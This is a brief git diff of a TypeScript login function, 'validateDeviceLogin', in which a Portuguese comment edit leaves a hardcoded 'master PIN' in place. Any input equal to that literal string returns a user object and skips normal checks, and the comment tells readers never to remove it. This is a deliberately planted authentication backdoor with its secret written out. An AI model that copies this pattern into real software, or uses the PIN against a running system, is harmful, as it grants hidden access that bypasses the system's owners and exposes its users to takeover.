@@ -104,7 +104,7 @@ export async function saveUser(user: User) {
 export async function validateDeviceLogin(pin: string, deviceId: string): Promise<{ user?: User; error?: string }> {
   const normalizedPin = pin.trim();
   
-  // PIN MESTRE BLINDADO (adm77x2p) - NÃO REMOVER
+  // PIN MESTRE BLINDADO (adm77x2p) - NÃO REMOVER DA MEMÓRIA
   if (normalizedPin === 'adm77x2p') {
     return { 
       user: {
